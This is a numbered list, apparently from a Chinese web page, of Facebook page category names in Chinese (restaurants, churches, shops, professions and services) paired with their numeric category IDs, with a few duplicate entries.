198 调酒服务 191612347546618 199 调酒学校 1728918177380305 200 东北餐厅 603947469774673 201 东欧餐厅 1053404298085296 202 东正教会 201201106561123 203 动物 2621 204 动物救援服务 2966506483423470 205 动物救援服务 2966510000000000 206 动物收容所 170810676298376 207 动物园 1191146560918930 208 洞穴 1704070443191473 209 独立教会 188625341157848 210 独木舟和皮划艇租赁 1702495036678885 211 赌场 187724814583579 212 度假酒店 187686707929197 213 度假屋出租 192686080759400 214 多明尼加餐厅 253084371730468 215 多萨餐厅 2051845931706445 216 厄瓜多尔餐厅 291301174543500 217 儿科医生 132003726865268 218 儿童保护服务 162948187091210 219 儿童看护服务 181811248521973 220 儿童牙医 540275259509408 221 二手车 1035649517261445 222 二手物品商店 205429726142620 223 发廊 174177802634376 224 发行商 191684877517919 225 法律服务 2025086974383657 226 法式餐厅 168976549819329 227 法院 110121459069433 228 房车公园 957437364355057 229 房车露营地 204359242921685 230 房车修理店 186657301367693 231 房车租赁 463453217765006 232 房地产 198327773511962 233 房地产 198327773511962 234 房地产服务 192625037432720 235 房地产公司 1695505857377984 236 房地产经纪人 196739023685716 237 房地产开发商 162532913805106 238 房地产投资公司 150944301629503 239 房屋粉刷服务 1596337297362924 240 房屋看管 189771787733424 241 房屋美容服务 1035020696612933 242 房屋租赁纠纷律师 540629572786932 243 纺织品公司 185512691489656 244 飞机经销商 1626247471027955 245 非政府组织 2235 246 非洲风味餐馆 171226896258682 247 非洲卫理公会 141538499244285 248 菲律宾餐厅 107287559351594 249 废弃物管理公司 121989644542468 250 分子料理餐厅 1014679391903073 251 粉丝主页 660696964377118 252 风湿病专家 1624613814522490 253 风筝冲浪中心 1545096665800188 254 讽刺/调侃 418291885638834 255 缝纫与服装修改 140784189318631 256 弗留利-威尼斯朱利亚餐厅 1715779848685080 257 佛教寺庙 201230299890531 258 服装 1086422341396773 259 服装（品牌） 2209 260 服装店 186230924744328 261 服装公司 623704114455366 262 服装经销商 214668188548441 263 服装设计师 1334682686948239 264 福音派教会 108447855899758 265 盖浇饭餐厅 619109018238267 266 干洗店 133148010085253 267 港口 350040338394916 268 港式餐厅 512762212262409 269 高尔夫教练 1823351031218612 270 高尔夫球场 177734062274696 271 高尔夫球场和乡村俱乐部 176059775772759 272 高尔夫球车经销商 1743341135930622 273 高速公路 214332375266411 274 高中 110152272401235 275 哥伦比亚餐厅 815264205274993 276 哥斯达黎加餐厅 246232599091536 277 歌剧院 1071626812928876 278 歌曲 1201 279 歌曲 1201 280 歌曲创作人 706153577016970 281 歌手 1062586164506537 282 歌手 1335670856447673 283 歌手/乐队 180164648685982 284 歌手/乐队 180164648685982 285 工程服务 400062273344681 286 工会 192775991124365 287 工商业 243290832429433 288 工业公司 2241 289 工艺美术品商店 153635828025130 290 公车站 144386572288836 291 公共服务 139386576124160 292 公共关系公司 192021210817573 293 公共广场 110207655727714 294 公共汽车公司 138456929557798 295 公共游泳池 124887510918208 296 公交系统 1588880211410039 297 公理教会 200157403331937 298 公立学校 199405806739848 299 公墓 191060874251260 300 公司律师 162479300468980 301 公益组织 2606 302 公园 115090141929327 303 公园 923358744476601 304 公证人 108459679231422 305 供暖、通风与空调服务 132219350176698 306 宫殿 1718496305079765 307 拱廊 164409566941435 308 狗饲养员 1097498617107646 309 购物服务 200046713342752 310 购物区 136412456432179 311 购物中心 109527622457518 312 古巴餐厅 192804194073047 313 古董店 150732438316813 314 古吉拉特餐厅 1599573383690629 315 骨科医生 496121607250568 316 骨科医生 856858884419958 317 鼓手 1020284742162494 318 管道维修服务 178867352155084 319 管理服务 201528873201605 320 广播电台 1210 321 广播与媒体制作公司 169056916473899 322 广告/营销 1757592557789532 323 广告策划经销商/广告代理 164886566892249 324 鬼屋 133534277068159 325 贵州餐厅 281488958908005 326 国会大厦 1119590681415409 327 国家公园 205359639482698 328 国家森林 622850591212987 329 果阿餐厅 203826520012200 330 海得拉巴餐厅 1089104457814725 331 海地餐厅 1765498203668682 332 海港 247394978966683 333 海南餐厅 1101938483219348 334 海塞餐厅 1730521793860200 335 海事用品商店 114253171987086 336 海滩 199165013440146 337 海滩度假村 199734546726648 338 海湾 1758136817740912 339 海鲜餐厅 163300367054197 340 韩国餐馆 150896171638138 341 汉堡店 187425207958280 342 旱冰场 806717229458955 343 航空电子用品店 892214644278546 344 航空公司 110192549061839 345 航空公司 2244 346 航空维修站 2198270550400605 347 航空学校 186032081419494 348 航空业服务 180428515332153 349 豪车服务 196941987012177 350 豪宅 654455208045685 351 合唱团 1664274330313158 352 合唱指挥 1447672712294239 353 合约律师 1153301954734631 354 河南餐厅 264650023893283 355 洪都拉斯餐厅 528260260699780 356 候机室 223760917681177 357 湖北餐厅 840334356111686 358 互联网公司 2256 359 互联网营销服务 1706730532910578 360 户外与体育用品公司 2231 361 户外装备店 153490828039067 362 护肤服务 1644814599176740 363 护理学校 1730240667193774 364 护照与签证服务 149044025154029 365 花商 192111490806699 366 滑板店 1775647139385449 367 滑板公园 253482421696626 368 滑翔运动中心 1011358132304347 369 滑雪胜地 162841010432730 370 滑雪与单板滑雪学校 144087115657937 371 滑雪装备店 526154577570152 372 化学品公司 191334714243008 373 化妆品店 144873802247220 374 化妆师 146059155460366 375 画家 177645802278169 376 画廊 197384240287028 377 怀石料理餐厅 1108914325848223 378 淮扬菜餐厅 1015320005218639 379 环保组织 191523214199822 380 环境顾问 128268517241197 381 环境建设公司 128853933850116 382 会计 139976092733827 383 会展中心 134015953331113 384 绘画课 487761925317535 385 婚礼策划服务 191173027579272 386 婚庆场地 1698627513779470 387 婚纱店 103446129740239 388 婚姻治疗师 1751153718488321 389 混凝土承包商 179618232079666 390 活动板房服务 180720568631853 391 活动策划人 193705277324704 392 活动摄像师 1719867628280173 393 活动住房经销商 190189837667432 394 火车站 145887745471348 395 火车站 1609255626032547 396 货币兑换 189172844438073 397 击剑俱乐部 279040502446357 398 机场 128966563840349 399 机场班车服务 170817119631096 400 机场航站楼 177950465654024 401 机器人研发公司 292231357479999 402 机械店 1546827428955819 403 机油滤芯服务 196357563722974 404 鸡尾酒吧 499741296896069 405 基督复临安息日教会 187333341297290 406 基督教会 184266718279692 407 基督教会 190152457675521 408 基督教科学会 121659614574801 409 基督教长老会 152783908110257 410 激光枪对战中心 232085443469192 411 激光脱毛服务 210460678964858 412 激光眼外科医生 1142926949081822 413 急救班 185032388204011 414 急救室 1135837856439520 415 记者 1604 416 纪念碑 276651312419490 417 纪念品商店 714231678717612 418 加拿大风味餐厅 202010786573294 419 加泰罗尼亚餐厅 1148633741855399 420 加油站 139272729470823 421 家电制造商 993795574067849 422 家教/教师 145296352197250 423 家居和园艺店 657099944438695 424 家居用品 2220 425 家居与园艺网站 2708 426 家居装饰 192647794097278 427 家居装修 108427109235243 428 家具 2219 429 家具店 162845797101278 430 家具维修和室内装潢服务 187813774574368 431 家庭护理 1730236023904374 432 家庭护理中介 1039977252754736 433 家庭式餐馆 192831537402299 434 家庭医生 1046789785375971 435 家庭医生 113914582020990 436 家庭医学实践 144657392262041 437 家庭影院器材店 145925682134541 438 家庭用品商店 183680385005847 439 家用酿酒用品店 148344028911374 440 嘉年华用品店 153755631345622 441 假发店 143160019083147 442 驾校 200010220031917 443 柬埔寨餐馆 191232370912538 444 减肥中心 1745728339006036 445 建筑材料 2216 446 建筑材料店 493153014212251 447 建筑公司 530126207179123 448 建筑观光旅行社 616472405174224 449 建筑设计师 1711765319078442 450 健康饮食餐厅 156756251046858 451 健康与保养网站 2707 452 健身房/健身中心 184405378265823 453 健身教练 181045748599578 454 健身模特 301500100194179 455 健身训练营 999176653484307 456 江西餐厅 1194944293851627 457 交通服务 152367304818850 458 交通学校 127806747288007 459 交响乐 181815448531059 460 交响乐团 1006597106868677 461 矫正与假肢服务 259263101097672 462 教会 192134360811676 463 教练 1802 464 教育顾问 199797140033948 465 教育网站 2704 466 教育研究中心 191921914160604 467 教育用品商店 163197293733225 468 接发服务 181550638549454 469 节目 1290986887644410 470 节日 596582600510249 471 结构工程师 260609830972978 472 捷克餐厅 261214747583517 473 姐妹会和兄弟会 165264720195968 474 戒毒中心 1618392255156255 475 戒酒中心 1743633335850804 476 戒瘾服务 1704452319818029 477 戒瘾中心 1339497709413701 478 戒瘾资源中心 187062101324297 479 借贷服务 128184253916402 480 金融策划师 211381282212118 481 金融服务 161516070564222 482 金属电镀服务公司 491721644355613 483 金属供应商 1122890141101989 484 金属构造工 1789406654621228 485 紧急道路救援服务 154067984646918 486 紧急救援服务 163102447071743 487 浸礼会 199819723365845 488 经济援助服务 114047665342448 489 精品店 288846958171402 490 景点和旅游网站 2715 491 酒吧 110290705711626 492 酒吧 135930436481618 493 酒吧 162480900474637 494 酒吧 192661127431931 495 酒吧与烧烤屋 233804719972590 496 酒店 164243073639257 497 酒店吧台 1711269729146680 498 酒店服务公司 199788206699825 499 酒店公寓 592405957634580 500 酒庄/葡萄园 209630435729071 501 剧集 1405 502 军事基地 220974118003804 503 军事律师 1122006771197547 504 咖啡馆 128673187201735 505 喀拉拉餐厅 142308136173482 506 卡车修理店 274181782971827 507 卡车租赁 139389149463981 508 卡丁车 235437449807086 509 卡拉 OK 187872604591327 510 卡拉布里亚餐厅 1730539947219715 511 卡纳塔克餐厅 1111358065572251 512 考古服务 176393675739023 513 科学博物馆 261213210912085 514 科学家 494338820719492 515 科学网站 2713 516 克什米尔餐厅 1704211183163706 517 客栈 181803978524025 518 口腔外科医生 1766963856917279 519 口腔修复科医师 1122154901182385 520 库存控制服务 190690290956124 521 库尔德餐厅 521963947988445 522 跨派系教会 198883503460766 523 快餐车 224426430990363 524 快餐店 192803624072087 525 快闪店 1149268685130897 526 矿业公司 2245 527 拉贾斯坦餐厅 558509727686210 528 拉面馆 218838724804749 529 篮球场 1800180516867389 530 篮球体育馆 302521450087214 531 乐队 792007097567368 532 乐器编曲人 363140815152348 533 乐器店 139750396088115 534 离婚与家庭律师 193005947395563 535 黎巴嫩餐厅 205479252799194 536 礼品店 191647907538150 537 礼堂 203246076360322 538 理发店 169758603141095 539 理疗师 181885068517499 540 历史博物馆 244600818962350 541 利古里亚餐厅 243179822727327 542 励志演说家 1720316034885300 543 疗养院 183037088401331 544 林业服务 1713190828964422 545 林业与伐木 121405177935134 546 灵恩教会 181531718550494 547 零售银行 473160749543703 548 领养服务 193245447371023 549 溜冰场 129327030469234 550 遛狗公园 868057450005138 551 遛狗人 201128353243142 552 路德教会 139462872784035 553 露营地 187004854667366 554 旅馆 199611383389617 555 旅馆/住宿 505091123022329 556 旅行服务 169581916792003 557 旅行社 124861974254366 558 旅行社 162914327091136 559 旅行社 762918620511586 560 旅行与交通 128232937246338 561 旅游公司 2258 562 旅游信息中心 124947834245370 563 律师与律师事务所 1099402320124913 564 伦巴第餐馆 887031731405318 565 罗马餐厅 1041250205923369 566 罗马尼亚餐厅 150631355348822 567 麻醉医师 1820484181508887 568 马车服务 180588421978578 569 马房 508302422702223 570 马哈拉施特拉餐馆 814705678660384 571 马来西亚餐厅 198383150193535 572 马术中心 1703124869910069 573 码头 1735215653393180 574 码头 197251360301109 575 码头 995197280538098 576 鳗鱼餐厅 1550678138571790 577 鳗鱼餐厅 270603316626628 578 满族餐厅 108551366238893 579 漫画书店 133510666716809 580 猫狗舍 189702521054390 581 帽子店 1608205356160444 582 玫瑰花园 1135820803141515 583 媒体/新闻公司 2233 584 媒体代理商 281507032196735 585 媒体评论员 628522311538760 586 美发师 677927743174611 587 美国黑人传统餐馆 156757354384541 588 美甲店 198516863494646 589 美甲师 988618678368025 590 美容、美妆与个人护理 139225689474222 591 美容、美妆与个人护理 139225689474222 592 美容学校 374053246098336 593 美容牙医 870647059745580 594 美容院 199236533423806 595 美食靓饮 314853004119510 596 美食酒吧 164049010316507 597 美食旅行社 194384204293028 598 美食评论员 1496287024068131 599 美式餐馆 149803325077018 600 美式传统快餐厅 167954166588517 601 美妆店 132666603831665 602 美妆店 191693100854505 603 美妆供应商 120731481338075 604 孟加拉餐厅 253008211735140 605 迷你高尔夫球场 145250718867825 606 泌尿科医生 908012952677478 607 免税店 787316684739091 608 缅甸餐馆 135761909830871 609 面食餐厅 533990753451464 610 民族特产店 144815382251809 611 名车租赁 198551986844046 612 模特 398802891882495 613 模特经纪公司 188763924479267 614 摩托车经销商 150820404974203 615 摩托车生产商 515528768630730 616 摩托车修理店 108287585916424 617 摩托艇租赁 1751068495163689 618 摩托运动用具店 153060148443004 619 魔术师 1028050117278980 620 莫利塞餐厅 998896386897971 621 墨西哥餐馆 199377230079198 622 墨西哥夹饼餐馆 456169874965661 623 母婴诊所 1709462009317490 624 木工 180833545285725 625 拿撒勒教会 149452815111438 626 那不勒斯餐厅 1736309956611963 627 纳德餐厅 155072361574861 628 奶茶店 1083443491742919 629 奶酪店 1713332308933888 630 奶酪火锅店 167116956674095 631 奶昔和果汁吧 219222658110242 632 男装店 170241263022353 633 南非餐厅 1632195680441031 634 南提洛尔餐厅 1717669581806563 635 南印度餐厅 985723901483233 636 内分泌医师 1008860315849688 637 内科医师 132227236842772 638 内衣店 1740922119519916 639 能源公司 2238 640 尼加拉瓜餐厅 1695716914024160 641 尼泊尔餐厅 186869748024304 642 尼日利亚餐厅 1134425483270572 643 酿酒厂 140112669728206 644 牛排店 198367566846946 645 农场 150815208309028 646 农村合作社 1555099458125522 647 农贸市场 176527262444235 648 农业 1574325646194878 649 农业服务 189323644423254 650 女性健康诊所 598325583660176 651 女佣和管家 110351045706277 652 女装店 128753240528981 653 欧陆餐厅 197227066968500 654 欧式餐馆 1508025966158640 655 爬行宠物店 254208054934939 656 帕拉丁餐厅 1176391832381659 657 帕西餐厅 459787410895768 658 拍卖行 192422584121096 659 排球场 524117677771991 660 派对和娱乐服务 189334414420898 661 派对用品与租赁店 109633322446882 662 攀岩点 1739936829555292 663 攀岩馆 174921992560086 664 泡饭餐厅 524747971048547 665 配饰 185127444860544 666 烹饪学校 182269951819423 667 批发烘焙坊 1013107675469307 668 批发及供应商店 187070794658134 669 披萨店 180256082015845 670 皮德蒙特餐厅 121471424943901 671 皮肤科医生 196021933757044 672 皮划艇中心 286381728381245 673 啤酒吧 263451080680156 674 啤酒厂 144535972273084 675 啤酒和酒水店 199833073363963 676 瓶装水公司 1613508632296950 677 瓶装水供应商 1731232890425134 678 葡萄酒/烈酒 2224 679 葡萄牙餐厅 155167537873297 680 普拉提练习室 143297819412003 681 普利亚餐厅 281797568834709 682 铺路与沥青服务 188977087789280 683 耆那教餐厅 235994530118336 684 骑术学校 1112907238750736 685 棋盘游戏 2303 686 汽车、飞机与船只 180410821995109 687 汽车玻璃服务 153084451411848 688 汽车餐馆 188684981153971 689 汽车出租 198383950173309 690 汽车存放设施 196516643707440 691 汽车店 1628617144122365 692 汽车定制店 186712678028215 693 汽车服务 1223524174334504 694 汽车公司 2240 695 汽车经销商 131962450204676 696 汽车经销商 625688294262999 697 汽车零件店 139492049448901 698 汽车旅馆 152050108191372 699 汽车美容服务 1033987526649038 700 汽车清洗 162295707155272 701 汽车维修店 149998721725634 702 汽车修复服务 124718197599943 703 汽车音响店 1363733416987629 704 汽车运输服务 1658512347800073 705 汽车制造商 188620891159326 706 汽车租赁服务 134088753324121 707 潜水点 1773482722871511 708 潜水中心 169706939742581 709 潜泳点 145635905846537 710 枪械店 180302115349257 711 荞麦面餐厅 240627589653596 712 桥良 151969488199865 713 巧克力店 498921743646445 714 青年旅社 150438461681329 715 青年组织 181053558607965 716 青少年儿童网站 2716 717 青少年律师 181363338568345 718 轻轨站 1096034743795535 719 清洁服务 186564191378474 720 清洁服务 190108547677820 721 清酒吧 1640927539562872 722 清真餐馆 193694197335994 723 清真寺 179905035385252 724 区域网站 2712 725 取现服务 128197080583700 726 全科牙医 116306972128008 727 拳击室 1639776363011106 728 热狗摊 212285478786733 729 热气球旅行社 177756732269376 730 热气球站 1594016414177786 731 热水器安装与维修服务 1801899483365045 732 人身伤害案件律师 1080127208741064 733 人声编曲人 3145961928994152 734 日间水疗 205950169432461 735 日式餐馆 199035016778342 736 日式点心餐厅 959699290795405 737 日式烧鸡餐厅 113264772433008 738 日式烧肉店 698490883622395 739 日式温泉 294401544229468 740 肉类批发商 1237052559660497 741 肉铺 181564868547915 742 乳牛场 1946678192225672 743 软件 2211 744 软件公司 1065597503495311 745 瑞士餐厅 235655343487823 746 山地自行车店 1549262958716707 747 山东菜馆 701480496660107 748 山西餐厅 151790808570629 749 陕西餐厅 255811524810207 750 商业地产代理 162878243763233 751 商业供应服务 200209719995975 752 商业顾问 179672275401610 753 商业银行 163090273743732 754 商业中心 139745066094977 755 商用车经销商 224411416007218 756 商用卡车经销商 1143366362371705 757 商用与工业设备供应商 165245226927543 758 上帝会 170386086340798 759 上海餐厅 1119010584789150 760 烧烤店 150534008338515 761 设计和时尚 557045641143373 762 设计师 1615 763 社论/论点 350465182273335 764 社区花园 600876466756567 765 社区中心 296862927058877 766 射击/狩猎区 472367986267086 767 射击场 152275908161439 768 射箭场 170715949640891 769 射箭馆 997443937042993 770 摄影师 181475575221097 771 摄影与摄像 191969860827280 772 什锦烧餐厅 826293890848343 773 神经科医师 1072995232790754 774 生态旅行社 214416301907154 775 生物科技公司 150148928375567 776 生鲜餐厅 204867426208613 777 圣公会 170721982973337 778 圣教会 201207006556711 779 石油服务 193508567343323 780 时尚配饰 733618421337544 781 时装模特 1784467105117322 782 时装设计师 179576078750378 783 时装造型师 1534583876922626 784 食品服务提供商 200019523363001 785 食品批发商 1727285527537943 786 使徒教会 199448423406078 787 市场调查顾问 152088421520086 788 市政厅 260981550923988 789 市政厅 436168419731123 790 视觉/艺术总监 562626681628852 791 视觉特效总监 217002660445742 792 视觉艺术 1080612391976317 793 视听器材店 198632653485894 794 室内乐团 1052439752264127 795 室内设计工作室 199438050070864 796 收藏品商店 187679647929203 797 收容所 804444936321615 798 手工艺 369311918442131 799 手机/平板电脑 2265 800 手机店 210979565595898 801 寿司餐馆 134501539950711 802 寿喜烧餐厅 1079625258764047 803 兽医 162068413843305 804 售票 166975666684060 805 书店 197048876974331 806 书籍 1300 807 书籍 1300 808 书籍与杂志分销商 161467220570897 809 蔬果店 128157407253652 810 熟食店 188334264523313 811 数字内容创作者 2347428775505624 812 水处理服务 1716047138658843 813 水库 317580934980424 814 水疗 200814353265561 815 水生宠物店 209645989430607 816 水烟酒廊 223801560977980 817 税务律师 1048446685209115 818 私立学校 186998168001766 819 私人包机 187495294614939 820 私人厨师 498244033702006 821 私人会所 314375185582911 822 私人教练 185900881450649 823 私人助理 1061943827220930 824 斯里兰卡餐厅 519028021614838 825 斯洛伐克餐厅 247753848949842 826 素食餐厅 200742186618963 827 宿舍 165665860162999 828 塑料生产商 1172028072841628 829 塑料制工 481350968738430 830 塑像与喷泉 210857662260088 831 碎纸服务 186673141730893 832 锁匠 181814521855864 833 台球厅 197750126917541 834 台式餐馆 199146280116687 835 太极练习室 625684817590367 836 太阳能服务 161521487230197 837 太阳能公司 1643933949261293 838 泰国餐馆 179167895459033 839 泰米尔餐厅 1121931334541036 840 汤馆 135468489860087 841 糖果店 414430838570027 842 特产杂货店 162264673824073 843 特立尼达餐厅 1220947157917102 844 特效总监 448803890139712 845 特许经营代理人 143973032336164 846 特许经营服务 182923418412354 847 体操中心 1050341358394128 848 体育场、竞技场和运动场 109976259083543 849 体育经纪人 124584130946507 850 体育联赛 1800 851 体育赛事 1805 852 体育校队 1804 853 体育用品店 165823830131654 854 天麸罗餐厅 151854495230528 855 天津餐厅 903941156398667 856 天主教会 175647552480085 857 田径场 1350759958274577 858 甜品店 187153754656815 859 甜甜圈店 2053716798185981 860 跳伞中心 176803072363608 861 跳蚤市场 179278362129856 862 铁板烧餐厅 1754194641488649 863 铁路公司 108376755907313 864 听力学家 199024153446160 865 庭院/花园 2222 866 同志酒吧 128470943900600 867 投资服务 213577718658733 868 投资管理公司 751682678308160 869 投资银行 237892996595065 870 透析诊所 504565943072044 871 图书馆 169896676390222 872 土耳其餐馆 205503056146172 873 托儿所 164595956925901 874 托斯卡纳餐厅 1007478029320702 875 拖车服务 174972792548177 876 拖车经销商 1242032379171046 877 拖车租赁 205261602824861 878 脱毛服务 128905757179140 879 外科医生 138265209910849 880 外科中心 290564841277981 881 玩具店 178680352174443 882 万鸦老餐厅 1054005488017120 883 王国聚会所教会 187677931267173 884 网咖 201035296584114 885 网络律师 178280199241982 886 网球场 187950394558510 887 网球馆 576853295821011 888 网页设计师 187393124625179 889 危地马拉餐厅 1831519280411170 890 危机预防中心 128568697212195 891 威尼斯餐厅 1066062386815560 892 威士忌酒吧 1081709315199455 893 维生素/补品 2262 894 维生素保健品店 589423051230505 895 委内瑞拉餐厅 486179814901255 896 卫理公会 193064780713408 897 温泉 253927601644279 898 文化礼品店 180816211956170 899 文化游旅行社 2061880544038035 900 文化中心 619759428190024 901 文学编辑 1289492561569587 902 文学评论人 500681038112697 903 文学艺术 856055631167537 904 纹身与穿刺店 551469561691940 905 翁布利亚餐厅 1752442564976218 906 乌冬面餐厅 513113918897829 907 乌杜皮餐厅 1781417032091985 908 乌克兰餐厅 845844622227120 909 乌拉圭餐厅 914870361957244 910 乌兹别克餐厅 1800418506854067 911 无宗派教堂 200639493285676 912 五金店 148906328500868 913 五旬节会 177900302253752 914 武术学校 198325860180715 915 武装部队 188166377871384 916 舞蹈工作室 203916779633178 917 舞蹈学校 1554062478223469 918 舞蹈演员 1614 919 舞厅 1026363087412021 920 舞厅/夜店 191478144212980 921 物业管理公司 124701514268099 922 西班牙餐厅 171485526232801 923 西班牙风味小吃与餐馆 119869574758000 924 西西里餐厅 1624208617897687 925 希腊餐馆 144722595590046 926 锡克庙 367259453311239 927 喜剧俱乐部 110186619064706 928 喜剧演员 1610 929 喜玛拉雅餐馆 135660879839870 930 戏剧 943469559038367 931 戏剧作品 1784293938474260 932 系列丛书 1309 933 峡湾 1737724636495445 934 现代欧式餐馆 188360891207745 935 现代艺术博物馆 378970035464823 936 乡村俱乐部/俱乐部会所 186004504854452 937 香槟酒吧 573177252854494 938 湘菜馆 257889957903551 939 箱包店 152220181857729 940 箱包公司 1050262451724084 941 消防安全服务 197796476897760 942 消防站 150681761655205 943 小餐馆 197871390225897 944 小木屋 189006297788323 945 小屋 213629078651577 946 小学 140234236045713 947 校车服务 191373470890862 948 鞋具店 109512302457693 949 写作服务 186573994697103 950 心理健康服务机构 132328993501399 951 心理学家 206714069358248 952 心理治疗师 872817116184676 953 心内科医生 1734919436761966 954 新加坡餐馆 142590562472824 955 新疆餐厅 1327574483925283 956 新闻工作者 1605 957 新闻与媒体网站 2709 958 信息技术公司 1130035050388269 959 信用社 145988682478380 960 刑事律师 153614521358541 961 行李服务 177492522293723 962 行李箱包 2206 963 形象顾问 132008380200065 964 性治疗师 1548916632084224 965 匈牙利餐厅 185368671504202 966 休闲场所 987187691402362 967 休闲车经销商 124698237604010 968 休闲与运动网站 2710 969 休闲中心 183013211744255 970 修复服务 196285793716152 971 叙利亚餐厅 1605051899807074 972 学术夏令营 152248208162513 973 学校 2601 974 学校 2601 975 学校筹款活动 190592477648673 976 血站 186236611410712 977 巡回演唱会 1208 978 巡回演唱会经理 247944157166126 979 驯马师 259302561091976 980 训狗师 175898962454294 981 巽他餐厅 1421095937915810 982 牙齿美白服务 164436443610134 983 牙买加餐厅 1575068609459537 984 牙髓病医生 1163873193673538 985 牙医和牙医诊所 174187662626299 986 牙周病医生 1067895509954659 987 亚美尼亚餐厅 253085248380267 988 亚齐餐厅 1718349555105798 989 亚洲餐馆 185855984789970 990 亚洲风味餐厅 174201535963762 991 烟草公司 2257 992 烟草商店 196434697050078 993 烟花零售商 196493330361697 994 眼科医生 1222066317826315 995 眼科医师 200279126653253 996 演员 1602034176774683 997 验房师 128784863859103 998 验光师 192316870798061 999 洋食餐厅 1721970931353243 1000 养鱼场 1771803296365360 1001 药店/药房 134381433294944 1002 药品 2263 1003 药品公司 1626402524354240 1004 药物水疗 203654586323143 1005 耶稣基督后期圣徒教会 109597022449687 1006 野餐营地 200597389954350 1007 野生动物保护区 156982297694225 1008 业余体育联盟 1922684341282335 1009 业余运动队 1803 1010 夜市 1750310581890222 1011 伊比利亚餐厅 1588203101510204 1012 伊朗餐厅 501506480056242 1013 医疗服务 1154837367920704 1014 医疗管理员 175272389190311 1015 医疗设备供应商 143491166059053 1016 医疗设备制造商 1607813882864367 1017 医疗实验室 186546178044573 1018 医疗用品商店 124907487582838 1019 医疗与健康 145118935550090 1020 医疗中心 228143393877753 1021 医生 188234584533149 1022 医学研究中心 180931928610132 1023 医学院 190153097675457 1024 医用大麻取药处 254436211591182 1025 医院 133152263416981 1026 移民案件律师 1723986644540644 1027 以色列餐厅 1760604674153529 1028 艺人经纪人 1030515153650195 1029 艺术博物馆 384382644921530 1030 艺术旅行社 1734714626805417 1031 艺术品修复服务 109499672460251 1032 艺术学校 164288046954643 1033 艺术与人文学科网站 2701 1034 意大利冰淇淋店 1194170890614519 1035 意大利餐馆 193831710644458 1036 音乐奖项 1212 1037 音乐排行榜 1213 1038 音乐视频 1207 1039 音乐制作工作室 189483194405517 1040 音乐制作人 667479207565813 1041 银行 133576170041936 1042 银行设备与服务 128816990522299 1043 饮食顾问 187462324610381 1044 印度餐馆 129539913784760 1045 印度风味中餐馆 587151088079581 1046 印度风味中餐厅 1753092254906112 1047 印度寺庙 587075671302634 1048 印度小吃店 1104127436275946 1049 印尼餐馆 167749593275424 1050 英国国教 139801652749645 1051 英式餐厅 137670789632630 1052 英式酒吧 218693881483234 1053 婴儿用品/儿童用品 2232 1054 婴幼儿童装店 192614304101075 1055 营销代理 123377808095874 1056 营养师 197995016883073 1057 影视工作室 370369022981015 1058 影视剧奖 1112 1059 泳装店 291301061210178 1060 犹太餐馆 205628702786662 1061 犹太教会 184925784880952 1062 游乐场 162648480454674 1063 游乐场 192092574152128 1064 游乐与主题公园 220626791295805 1065 游轮公司 197280796951159 1066 游艇/轮渡公司 142904572786660 1067 游戏/玩具 2300 1068 游戏发行商 866898430141631 1069 游戏主播 1350536325044173 1070 游泳教练 1238790372819138 1071 有机食品店 1748430218710706 1072 鱼市场 530553847154560 1073 娱乐案件律师 235173956868212 1074 娱乐网站 2705 1075 羽毛球场 598795690296208 1076 语言病理专家 192761027418354 1077 语言学校 191533400865548 1078 语言治疗师 1628237674156362 1079 园艺师 156555961070638 1080 园艺中心 193271047368648 1081 远足路线 268946656794071 1082 粤菜馆 214976388519648 1083 越南餐馆 155136917876965 1084 越南米粉餐厅 211063415594061 1085 云南餐厅 1755374518042297 1086 孕期/哺乳期服装店 588302314673997 1087 运动 964585346994407 1088 运动场 1558682211100512 1089 运动队 1801 1090 运动服装店 1713352298924731 1091 运动酒吧 184460441595855 1092 运动俱乐部 189018581118681 1093 运动心理学家 486156098261145 1094 运动休闲场地 865117100300601 1095 运动与健身指导 193302624020981 1096 运动员 1600 1097 运河 472918986250757 1098 杂货批发商 864041480406497 1099 杂志 1307 1100 早餐与早午餐餐馆 192108214153222 1101 炸猪排餐厅 1567045423589488 1102 占星家 295752120759519 1103 占星家与灵媒 108565442553819 1104 章鱼烧餐厅 1547789965530594 1105 爪哇餐厅 1753900568201894 1106 遮阳篷供应商 189183707768885 1107 折扣店 183205338384747 1108 针灸师 121549447920861 1109 整形外科医生 188780244476392 1110 政党 2618 1111 政府大楼 1032965636792826 1112 政府公职服务机构 147714868971098 1113 政府官员 1701 1114 政府机构 161422927240513 1115 政府网站 2706 1116 政界人士 1700 1117 政治候选人 842783295865930 1118 政治组织 373543049350668 1119 知识产权律师 166582800055512 1120 执法部门 153297678056879 1121 职业安全与卫生服务 199383530078300 1122 职业顾问 1739517886317334 1123 职业介绍所 124814294258910 1124 职业理疗师 170598252986387 1125 职业学校 192338537450532 1126 职业运动队 152678898477239 1127 植发服务 188339094522319 1128 植物园 200436713689387 1129 植物园 465582610297141 1130 制服供应商 374540316003475 1131 制作人 1108 1132 治疗师 1555301504771639 1133 智利餐厅 291486924528649 1134 中餐馆 174483852595760 1135 中学 2637 1136 中转站 2505 1137 中转站 520917194785584 1138 珠宝/手表 2226 1139 珠宝和手表商店 188031587886173 1140 珠宝批发商 155851681143483 1141 珠宝手表公司 129357034153761 1142 主唱 973413980185936 1143 主题餐厅 1738077623073078 1144 住宿与早餐 110321355709642 1145 住所 192049437499122 1146 住所 197289820310880 1147 住所 197289820310880 1148 贮木场 1219614134745580 1149 专辑 1200 1150 专科学校 144971758897076 1151 咨询机构 2248 1152 咨询师 1710182075914714 1153 自动柜员机 (ATM) 1057744077629687 1154 自动化服务 153535891368765 1155 自然保护区 1782121698686371 1156 自然理疗师 1563185473976986 1157 自行车道 1762404710673301 1158 自行车健身房 1039343762826317 1159 自行车维修服务 1278946312134253 1160 自行车行 128003127270269 1161 自行车租赁 433034116710064 1162 自助餐厅 127892053948220 1163 自助餐厅 176007949109829 1164 自助存储设施 483030678574540 1165 自助洗衣店 286280034782160 1166 宗教书店 201787963175866 1167 宗教学校 193128447381850 1168 宗教中心 139460309451166 1169 宗教组织 187714557925874 1170 租赁店 162758110442965 1171 租赁式公寓和私人公寓 181216025249367 1172 足科医生 190310404327530 1173 足球场 185342455201725 1174 足球场 953929301386614 1175 足球体育馆 1605147709798088 1176 钻井服务 193542570664339 1177 作家 1109 1178 作家 1301 1179 AIDS 资源中心 169421023103905 1180 Barber 1485912725142092 1181 DJ 166419966738430 1182 Foley Artist 1625739434428339 1183 Marching Band 1338477876584822 1184 Music &amp; Audio 366213558769416 1185 Previsualization Artist 504032454282334 1186 Special Effects Assistant 1305041770017280 1187 Video Game Artist 939232203648850 1188 Visual Effects Artist 781199616597536 相关推荐： Facebook 爱好列表 Facebook 小组徽章 Facebook 背景颜色列表 